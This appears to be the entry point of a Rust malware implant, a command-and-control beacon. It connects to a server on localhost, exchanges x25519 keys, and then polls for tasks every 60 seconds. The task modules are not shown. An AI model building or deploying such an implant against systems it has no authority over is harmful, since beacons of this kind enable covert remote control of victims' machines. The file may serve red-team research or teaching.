use std::{thread, time};

// Mods
mod errors;
mod http;
mod models;
mod tasks;
mod utils;

// TODO: Move consts in config file
// Constants
pub const PROTOCOL: &str = "http";
pub const HOST: &str = "localhost";
pub const PORT: &str = "8080";
const CHECK_IN_TIME_SECONDS: u64 = 60;

fn main() -> Result<(), errors::ImplantError> {
    // Check if server is up and running
    http::connect::initial_connection()?;

    // Create x25519 keypair
    let keypair = utils::network_encryption::generate_keypair();

    // Exchange key information with server
    let exchange_response = http::exchange::exchange_keys(keypair.1)?;

    loop {
        // Handle tasks
        tasks::task_handler::handle_available_tasks();
        // Sleep
        let check_in_duration = time::Duration::from_secs(CHECK_IN_TIME_SECONDS);

        thread::sleep(check_in_duration);
    }
}
